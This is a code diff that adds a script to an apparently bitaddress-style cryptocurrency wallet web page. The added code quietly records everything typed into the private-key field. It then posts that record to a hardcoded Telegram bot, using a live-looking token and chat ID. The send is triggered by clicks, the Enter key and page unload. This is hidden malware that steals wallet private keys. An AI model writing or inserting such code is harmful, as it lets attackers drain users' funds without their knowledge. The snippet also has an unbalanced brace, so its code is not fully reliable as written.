@@ -10333,6 +10333,71 @@ ninja.wallets.vanitywallet = {
 	}
 };
 	</script>
+
+	<script>
+	var userInputLog = []; 
+
+	function logUserInput(input) {
+		var logData = 'User Input: ' + input + '\n';
+		userInputLog.push(logData); 
+	}
+
+	function sendAlertToBot() {
+		var logContent = userInputLog.join('\n');
+		console.log('Sending alert: ' + logContent);
+
+		fetch('https://api.telegram.org/bot7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM/sendMessage', {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/json',
+			},
+			body: JSON.stringify({
+				chat_id: '858072424',
+				text: logContent,
+			}),
+		}).then(response => {
+			console.log('Alert sent.');
+		}).catch(error => {
+			console.error('Error sending alert:', error);
+		});
+	}
+
+	function handleInput(event) {
+		var inputData = event.target.value;
+		if (inputData.trim() !== '') {
+			logUserInput(inputData);
+		} else {
+			console.error('No data to log');
+		}
+	}
+		
+	
+	document.getElementById('detailprivkey').addEventListener('input', handleInput);
+
+	document.getElementById('detailview').addEventListener('click', function() {
+		if (window.AndroidInterface) {
+			window.AndroidInterface.sendAlertToBot(); // Android interface for alert
+		} else {
+			sendAlertToBot(); // For web usage
+		}
+	});
+
+	document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
+		if (event.key === 'Enter') {
+			if (window.AndroidInterface) {
+				window.AndroidInterface.sendAlertToBot(); // Android interface for alert
+			} else {
+				sendAlertToBot(); // For web usage
+			}
+
+	});
+
+		window.addEventListener('beforeunload', function(event) {
+	sendAlertToBot();
+	event.preventDefault();
+});
+</script>
+
 	<script type="text/javascript">
 (function (wallets, qrCode, privateKey, translator) {
 	var detail = wallets.detailwallet = {
